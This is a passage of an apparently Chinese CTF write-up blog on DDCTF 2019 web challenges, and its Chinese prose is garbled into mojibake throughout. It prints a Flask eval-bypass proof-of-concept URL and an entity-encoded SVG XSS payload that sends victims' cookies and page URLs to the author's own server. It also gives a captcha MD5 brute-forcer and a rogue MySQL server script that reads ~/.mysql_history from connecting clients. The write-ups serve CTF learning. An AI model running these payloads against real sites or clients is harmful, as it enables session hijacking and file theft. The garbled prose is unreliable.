            html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos;
            html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;

        for line in source:
            if bool_download_source != &apos;True&apos;:
                html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;)
            else:
                html += line
        source.close()

        if bool_download_source == &apos;True&apos;:
            headers = {}
            headers[&apos;Content-Type&apos;] = &apos;text/plain&apos;
            headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos;
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event(&apos;action:view;index&apos;)

def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0: return &apos;invalid number({}) of diamonds to buy&lt;br /&gt;&apos;.format(args[0])
    session[&apos;num_items&apos;] += num_items
    trigger_event([&apos;func:consume_point;{}&apos;.format(num_items), &apos;action:view;index&apos;])

def consume_point_function(args):
    point_to_consume = int(args[0])
    if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException()
    session[&apos;points&apos;] -= point_to_consume

def show_flag_function(args):
    flag = args[0]
    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return &apos;You naughty boy! ;) &lt;br /&gt;&apos;

def get_flag_handler(args):
    if session[&apos;num_items&apos;] &gt;= 5:
        trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries
    trigger_event(&apos;action:view;index&apos;)

if __name__ == &apos;__main__&apos;:
    app.run(debug=False, host=&apos;0.0.0.0&apos;) </code></pre>
                                    <p>
                                        ä¸çœ‹æºç ä¹Ÿåº”è¯¥èƒ½çŒœåˆ°å¤§æ¦‚ï¼Œè¿™é“é¢˜ç›®å¤§æ¦‚æ„æ€æ˜¯æ¯ä¸ªsessionå¯ä»¥ä¹°ä¸‰æ¬¡é’»çŸ³ï¼Œä½†æ˜¯ä¹°åˆ°äº”é¢—æ‰æœ‰å¯èƒ½å»æŸ¥çœ‹flagï¼Œæ‰€ä»¥é¦–å…ˆéœ€è¦ç»•è¿‡ï¼Œè´­ä¹°é™åˆ¶ï¼Œç„¶åè¿›è¡Œä¸‹ä¸€æ­¥çš„å¯æ§å‚æ•°æ„é€ å‡½æ•°æ¥æ‰§è¡Œã€‚</p>
                                    <p>é¦–å…ˆä»flagå‡½æ•°å…¥æ‰‹ã€‚</p>
                                    <pre><code>def get_flag_handler(args):
    if session[&apos;num_items&apos;] &gt;= 5:
        trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries
    trigger_event(&apos;action:view;index&apos;) </code></pre>
                                    <p>å¦‚æœsessionä¸­å·²ç»è´­ä¹°çš„æ•°é‡å¤§äº5ï¼Œé‚£ä¹ˆè°ƒç”¨trigger_event(),</p>
                                    <pre><code>def trigger_event(event):
    session[&apos;log&apos;].append(event)
    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event) </code></pre>
                                    <p>
                                        è€Œæœ€ç»ˆæ‰§è¡Œäº†æ­¤flagå‡½æ•°ä¹‹åå¹¶ä¸ä¼šç›´æ¥æ˜¾ç¤ºflagï¼Œè¿™ä¸€å¥session[â€˜logâ€™].append(event)ä¼šå°†flagæ‹¼æ¥åˆ°sessionä¸­å»ï¼Œflaskçš„sessionåˆ†ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç¬¬ä¸€éƒ¨åˆ†å°±æ˜¯æ­£å¸¸çš„ä¸€äº›æäº¤æ•°æ®ï¼Œç¬¬äºŒéƒ¨åˆ†æ—¶é—´æˆ³ï¼Œç„¶åæ‹¼æ¥ä¸Šç­¾åï¼Œç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥æ˜æ–‡æŸ¥çœ‹çš„ï¼Œé™„ä¸ŠPç‰›çš„sessionè„šæœ¬ã€‚</p>
                                    <pre><code>#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b&apos;.&apos;, 1)
    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)

    decompress = False
    if payload.startswith(b&apos;.&apos;):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(&apos;Could not base64 decode the payload because of &apos;
                         &apos;an exception&apos;)

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(&apos;Could not zlib decompress the payload before &apos;
                             &apos;decoding the payload&apos;)

    return session_json_serializer.loads(payload)

if __name__ == &apos;__main__&apos;:
    print decryption(sys.argv[1].encode())</code></pre>
                                    <p>é¦–å…ˆéšä¾¿å¤åˆ¶ä¸€æ®µé¢˜ç›®çš„sessionæ¥è¿›è¡Œè§£ç ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555572984.jpg" alt>
                                    </p>
                                    <p>sessionä¿å­˜äº†æ•°æ®ï¼Œå·²ç»ä¹°äº†ä¸¤ä¸ªè¿˜æœ‰ä¸€æ¬¡è´­ä¹°çš„æœºä¼šã€‚è¿˜æœ‰logï¼Œæ˜¯æœ€åæŸ¥çœ‹flagçš„æ—¶å€™ä¼šæ‹¼æ¥è¿›å»çš„æ•°æ®ã€‚</p>
                                    <p>å¹¶ä¸”logåªä¼šä¿å­˜äº”æ¡ã€‚ç„¶åå°±æ˜¯å¦‚ä½•æ‰§è¡Œdef get_flag_handler(args): å‡½æ•°äº†ã€‚</p>
                                    <p>åœ¨def execute_event_loop():
                                        å‡½æ•°ä¸­æœ‰evalå‡½æ•°å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰§è¡Œå‡½æ•°ã€‚å¹¶ä¸”å­˜åœ¨æ‹¼æ¥ï¼Œè¾“å…¥çš„å‚æ•°å°†ä¼šæ‹¼æ¥_handlerï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„å‡½æ•°ã€‚</p>
                                    <pre><code>try:
       event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))
       ret_val = event_handler(args) </code></pre>
                                    <p>ä½†æ˜¯å¯¹è¾“å…¥å­—ç¬¦æœ‰æ§åˆ¶ï¼Œ</p>
                                    <pre><code>valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) </code></pre>
                                    <p>
                                        åªèƒ½è¾“å…¥é™å®šå­—ç¬¦æ‹¼æ¥æŒ‡å®šçš„handleræˆ–è€…functionï¼Œå°†#urlç¼–ç ï¼Œæ¥ç»•è¿‡evalå‡½æ•°çš„è§£æï¼Œç¬¬ä¸€æ¬¡çš„æ‹¼æ¥ä¸ºtrigger_event#_handlerï¼Œåœ¨evalå‡½æ•°é‡Œæ‰§è¡Œåˆ™ä¼šçœç•¥#åçš„_handerï¼Œä»è€Œæ‰§è¡Œtrigger_eventï¼Œé€šè¿‡trigger_event()å°†flagå†™è¿›session_logã€‚</p>
                                    <p>ä½†æ˜¯å¦‚æœè¦æ‰§è¡Œexecute_event_loop()é‡Œçš„evalå’Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼Œéœ€è¦def
                                        trigger_event(event)é‡Œçš„</p>
                                    <pre><code>if type(event) == type([]):
    request.event_queue += event
else:
    request.event_queue.append(event)</code></pre>
                                    <p>å°†äº‹ä»¶åŠ å…¥é˜Ÿåˆ—ã€‚ä»è€Œæ‰§è¡Œbugï¼Œget_flag</p>
                                    <p>æœ€ç»ˆpoc </p>
                                    <pre><code>http://116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;30%23action:get_flag;322</code></pre>
                                    <p>å› ä¸ºè´­ä¹°çš„è§„åˆ™æ˜¯å…ˆè´­ä¹°ï¼Œè´­ä¹°æˆåŠŸååœ¨åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œæ­¤æ—¶get_flagå·²ç»æ‰§è¡Œï¼Œæ‰€ä»¥ä¾¿å¯ä»¥ç»•è¿‡åªèƒ½è´­ä¹°ä¸‰ä¸ªçš„é™åˆ¶ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555588231.jpg" alt>
                                    </p>
                                    <p>
                                        å¯ä»¥çœ‹åˆ°æ‰§è¡Œbuy,get_flagä¹‹åæ‰ä¼šåˆ¤æ–­åˆæ³•ï¼Œè¿›è€Œå›æº¯ï¼Œå¹¶ä¸å½±å“è·å¾—flagï¼Œè€Œåœ¨è·å¾—flagä¹‹åæ‰ä¼šæ‰§è¡Œåˆ¤æ–­å›æº¯å‡½æ•°ï¼Œå°†è´­ä¹°æ•°é‡é‡ç½®ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555579003.jpg" alt>
                                    </p>
                                    <p>å¯¹è¿”å›çš„æ•°æ®è¿›è¡Œè§£ç ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555579055.jpg" alt>
                                    </p>
                                    <h1 id="æ¬¢è¿æŠ¥åDDCTF"><a href="#æ¬¢è¿æŠ¥åDDCTF" class="headerlink"
                                                          title="æ¬¢è¿æŠ¥åDDCTF"></a>æ¬¢è¿æŠ¥åDDCTF</h1>
                                    <p>ç”±äºé¢˜ç›®æš‚æ—¶å…³é—­ï¼Œç®€å•å†™ä¸‹æ­¤é¢˜wpã€‚</p>
                                    <p>è¿›å»ä¹‹åæ˜¯ä¸€ä¸ªæŠ¥åé¡µé¢ï¼Œå‰ä¸¤ä¸ªæ¡†é™å®šäº†å­—ç¬¦20ä¸”å¿…å¡«ï¼Œæœ€åä¸€ä¸ªæ¡†æ— ä»»ä½•é™åˆ¶ï¼Œä½†æ˜¯æœªä½œXSSé™åˆ¶ã€‚</p>
                                    <p>å¬è¯´è¿™é‡Œä¹Ÿå¯ä»¥XSS è¯»å–æºç ï¼Œä¸è¿‡æˆ‘æ˜¯ç®€å•XSS</p>
                                    <pre><code>&lt;img src=vpsIP&gt;</code></pre>
                                    <p>è¯·æ±‚å¤´é‡Œå¸¦äº†ä¸€ä¸ªæç¤ºï¼Œ<a href="http://139.199.107.193/hint.php"
                                                     target="_blank" rel="noopener">http://139.199.107.193/hint.php</a>
                                    </p>
                                    <p><img src="http://47.106.185.69/1/./img/1555665443.jpg" alt>
                                    </p>
                                    <p>å‘è¡¨æ–‡ç« ä¹‹åä¼šç»™ä½ æ–‡ç« çš„é“¾æ¥ï¼Œå¼€å§‹è¿˜ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555665488.jpg" alt>
                                    </p>
                                    <p>å‘ç°åé¦ˆé¡µé¢ï¼Œè¿™å°±å¾ˆæ¸…æ¥šäº†å‘è¡¨æ–‡ç« ï¼Œç„¶åç»™æœåŠ¡å™¨æ¥æŸ¥çœ‹ï¼Œå¯¼è‡´XSSï¼Œ</p>
                                    <p>XSSç»•è¿‡ä¸å¤šè¯´äº†ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„XSSå°ç»“é‡Œçš„svgé»‘é­”æ³•ã€‚</p>
                                    <pre><code>&lt;svg&gt;&lt;script&gt;

&amp;#118;&amp;#97;&amp;#114;&amp;#32;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#52;&amp;#55;&amp;#46;&amp;#49;&amp;#48;&amp;#54;&amp;#46;&amp;#49;&amp;#56;&amp;#53;&amp;#46;&amp;#54;&amp;#57;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#105;&amp;#110;&amp;#100;&amp;#101;&amp;#120;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#59;
&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#40;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#73;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&amp;#40;&amp;#41;&amp;#41;&amp;#46;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#43;&amp;#39;&amp;#47;&amp;#63;&amp;#107;&amp;#101;&amp;#101;&amp;#112;&amp;#115;&amp;#101;&amp;#115;&amp;#115;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#49;&amp;#38;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#116;&amp;#111;&amp;#112;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#116;&amp;#111;&amp;#112;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#40;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#38;&amp;#38;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#41;&amp;#63;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#58;&amp;#39;&amp;#39;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#59;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#59;


&lt;/script&gt;</code></pre>
                                    <p>
                                        åŠ è½½XSSè„šæœ¬ï¼Œç®€å•æä¸€ä¸‹ï¼Œåœ¨svgæ ‡ç­¾é‡Œçš„æ‰€æœ‰å®ä½“åŒ–ç¼–ç éƒ½å¯ä»¥è¢«è§£æè¿˜åŸï¼Œå› ä¸ºè¿™é‡ŒæŠ•ç¨¿è¿‡æ»¤äº†å•å¼•å·åŒå¼•å·ç­‰äºå·æ‹¬å·ï¼Œèƒ½è¿‡æ»¤çš„éƒ½è¿‡æ»¤äº†ã€‚</p>
                                    <p>éªŒè¯ç è„šæœ¬ã€‚</p>
                                    <pre><code># -*- coding: utf-8 -*-
import hashlib
from multiprocessing.dummy import Pool as ThreadPool
# MD5æˆªæ–­æ•°å€¼å·²çŸ¥ æ±‚åŸå§‹æ•°æ®
# ä¾‹å­ substr(md5(captcha), 0, 6)=60b7ef

def md5(s):  # è®¡ç®—MD5å­—ç¬¦ä¸²
    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()

keymd5 = &apos;5ffe8d&apos;   #å·²çŸ¥çš„md5æˆªæ–­å€¼
md5start = 0   # è®¾ç½®é¢˜ç›®å·²çŸ¥çš„æˆªæ–­ä½ç½®
md5length = 6

def findmd5(sss):    # è¾“å…¥èŒƒå›´ é‡Œé¢ä¼šè¿›è¡Œmd5æµ‹è¯•
    key = sss.split(&apos;:&apos;)
    start = int(key[0])   # å¼€å§‹ä½ç½®
    end = int(key[1])    # ç»“æŸä½ç½®
    result = 0
    for i in range(start, end):
        # print(md5(i)[md5start:md5length])
        if md5(i)[0:6] == keymd5:            # æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸²
            result = i
            print(result)    # æ‰“å°
            break


list=[]  # å‚æ•°åˆ—è¡¨
for i in range(10):   # å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾
    list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1)))
pool = ThreadPool()    # å¤šçº¿ç¨‹ä»»åŠ¡
pool.map(findmd5, list) # å‡½æ•° ä¸å‚æ•°åˆ—è¡¨
pool.close()
pool.join()</code></pre>
                                    <p>ç„¶åå¯ä»¥æ‰“åˆ°cookieæ‰§è¡Œæ‰€æœ‰çš„jsè„šæœ¬</p>
                                    <pre><code>http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php</code></pre>
                                    <p>çš„é¡µé¢æ˜¾ç¤ºæ²¡æœ‰ç™»é™†ï¼Œåº”è¯¥æ˜¯éœ€è¦ç®¡ç†å‘˜æŸ¥çœ‹æ­¤é¡µé¢ï¼Œè¯»å–admin.phpæºç å¾—åˆ°æ–°çš„åšé¢˜ç›®å½•ã€‚</p>
                                    <pre><code>http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=</code></pre>
                                    <p>å®½å­—èŠ‚æ³¨å…¥ã€‚è·å¾—flagã€‚</p>
                                    <h1 id="mysqlå¼±å£ä»¤"><a href="#mysqlå¼±å£ä»¤" class="headerlink"
                                                         title="mysqlå¼±å£ä»¤"></a>mysqlå¼±å£ä»¤</h1>
                                    <p>è¿™é“é¢˜è€ƒçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒç¥ä»™æ“ä½œã€‚</p>
                                    <p>å‚è€ƒï¼š<a
                                            href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/"
                                            target="_blank" rel="noopener">https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</a>
                                    </p>
                                    <p>MySQLåè®®ä¸­æ¯”è¾ƒç‰¹åˆ«çš„ä¸€ç‚¹å°±æ˜¯å®¢æˆ·ç«¯å¹¶ä¸ä¼šå»è®°å½•å·²è¯·æ±‚çš„å‘½ä»¤ï¼Œè€Œæ˜¯æ ¹æ®æœåŠ¡å™¨çš„å“åº”æ¥æ‰§è¡ŒæŸ¥è¯¢ã€‚</p>
                                    <p>è¿™æ„å‘³ç€æ¶æ„MySQLæœåŠ¡å™¨å¯ä»¥æ¨¡æ‹Ÿåˆå§‹æ¡æ‰‹è¿‡ç¨‹ï¼Œç­‰å¾…SQLè¯­å¥æ•°æ®åŒ…ï¼Œå¿½ç•¥è¿™ä¸ªæ•°æ®åŒ…ç„¶åå“åº”ä¸€ä¸ªLOCAL DATA
                                        INFILEè¯·æ±‚ã€‚</p>
                                    <p>ä¹Ÿå°±æ˜¯åœ¨æˆ‘ä»¬åœ¨æœåŠ¡ç«¯è¿è¡Œpyæ–‡ä»¶æ¨¡æ‹ŸmysqlæœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è¿æ¥çš„æ—¶å€™æ„é€ æ¶æ„æ•°æ®åŒ…è¯»å–å®¢æˆ·ç«¯çš„æ–‡ä»¶ã€‚</p>
                                    <p>é¢˜ç›®æä¾›çš„ agent.py å…¶å®æ˜¯ä¸ºäº†æ£€æµ‹å®¢æˆ·ç«¯æœ¬åœ°æ˜¯å¦å¼€å¯äº† mysql æœåŠ¡ï¼Œåªéœ€è¦å¾€å›å‘é€å­—ç¬¦ä¸² mysqld
                                        å°±èƒ½ç»•è¿‡æ£€æµ‹ã€‚</p>
                                    <p>é¦–å…ˆè¿è¡Œagent.py åªæ˜¯ä¸ºäº†æ£€æµ‹æ˜¯å¦å¼€å¯äº†mysqlï¼Œ</p>
                                    <pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 12/1/2019 2:58 PM
# @Author  : fz
# @Site    :
# @File    : agent.py
# @Software: PyCharm

import json
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from optparse import OptionParser
from subprocess import Popen, PIPE


class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        request_path = self.path

        print(&quot;\n----- Request Start -----&gt;\n&quot;)
        print(&quot;request_path :&quot;, request_path)
        print(&quot;self.headers :&quot;, self.headers)
        print(&quot;&lt;----- Request End -----\n&quot;)

        self.send_response(200)
        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)
        self.end_headers()

        result = self._func()
        self.wfile.write(json.dumps(result))


    def do_POST(self):
        request_path = self.path

        # print(&quot;\n----- Request Start -----&gt;\n&quot;)
        print(&quot;request_path : %s&quot;, request_path)

        request_headers = self.headers
        content_length = request_headers.getheaders(&apos;content-length&apos;)
        length = int(content_length[0]) if content_length else 0

        # print(&quot;length :&quot;, length)

        print(&quot;request_headers : %s&quot; % request_headers)
        print(&quot;content : %s&quot; % self.rfile.read(length))
        # print(&quot;&lt;----- Request End -----\n&quot;)

        self.send_response(200)
        self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;)
        self.end_headers()
        result = self._func()
        self.wfile.write(json.dumps(result))

    def _func(self):
        netstat = Popen([&apos;netstat&apos;, &apos;-tlnp&apos;], stdout=PIPE)
        netstat.wait()

        ps_list = netstat.stdout.readlines()
        result = [{&apos;local_address&apos;:&quot;0.0.0.0:3306&quot;,&quot;Process_name&quot;:&quot;1234/mysqld&quot;}]
        for item in ps_list[2:]:
            tmp = item.split()
            Local_Address = tmp[3]
            Process_name = tmp[6]
            tmp_dic = {&apos;local_address&apos;: Local_Address, &apos;Process_name&apos;: &apos;mysqld&apos;}
            result.append(tmp_dic)
        return result

    do_PUT = do_POST
    do_DELETE = do_GET


def main():
    port = 8123
    print(&apos;Listening on localhost:%s&apos; % port)
    server = HTTPServer((&apos;0.0.0.0&apos;, port), RequestHandler)
    server.serve_forever()


if __name__ == &quot;__main__&quot;:
    parser = OptionParser()
    parser.usage = (
        &quot;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&quot;
        &quot;Run:\n\n&quot;)
    (options, args) = parser.parse_args()

    main()</code></pre>
                                    <p>ç„¶åè¿è¡Œä»¥ä¸‹è„šæœ¬è¯»å–flagã€‚</p>
                                    <pre><code>import socket
from time import sleep

filename=&apos;~/.mysql_history&apos;

a=&apos;4a0000000a352e352e353300050000007b212f663926524900fff72102000f8015000000000000000000005963644f3d2336265b796f41006d7973716c5f6e61746976655f70617373776f726400&apos;.decode(&apos;hex&apos;)
b=&apos;0100000200&apos;.decode(&apos;hex&apos;)
c=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename

HOST = &apos;0.0.0.0&apos;
PORT = 3306

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

print &apos;Server start at: %s:%s&apos; %(HOST, PORT)
print &apos;wait for connection...&apos;

while True:
    conn, addr = s.accept()
    print &apos;Connected by &apos;, addr
    conn.send(a)
    print conn.recv(1024).encode(&apos;hex&apos;)
    conn.send(b)
    print conn.recv(1024).encode(&apos;hex&apos;)
    conn.send(c)
    print conn.recv(1024)[4:]</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1555740061.jpg" alt>
                                    </p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/04/13/è¥¿æ¹–æŒ‘æˆ˜èµ›/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/04/13/è¥¿æ¹–æŒ‘æˆ˜èµ›/"
                                           itemprop="url">è¥¿æ¹–æŒ‘æˆ˜èµ›web</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-04-13T00:00:00+08:00">
                2019-04-13
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <p><img src="http://47.106.185.69/1/./img/1555123172.jpg" alt>
                                    </p>
                                    <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€
                                    </h1>
                                    <p>è¿™æ¬¡è¥¿æ¹–CTFæ„Ÿè§‰éš¾åº¦é€‚ä¸­ï¼Œå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ã€‚è®°ä¸‹æ¥åšä¸ªç¬”è®°ã€‚</p>
